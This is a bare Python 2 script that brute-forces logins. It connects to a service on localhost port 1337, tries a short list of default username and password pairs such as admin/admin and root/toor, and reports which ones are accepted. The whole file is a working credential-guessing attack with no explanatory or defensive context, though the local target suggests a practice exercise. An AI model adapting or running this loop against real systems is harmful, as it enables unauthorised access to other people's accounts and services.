import socket

wordlist = [('admin', '123456'), ('admin', 'admin'), ('root', 'toor')]

for username, password in wordlist:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 1337)

    sock.connect(server_address)
    sock.recv(1024)
    sock.send(username + "\n")
    sock.recv(1024)
    sock.send(password + "\n")
    result = sock.recv(1024).strip()

    if "denied" in result:
        print "[!] False, username = {0}, password = {1}".format(username, password)
    else:
        print "[*] True, username = {0}, password = {1}".format(username, password)

    sock.close()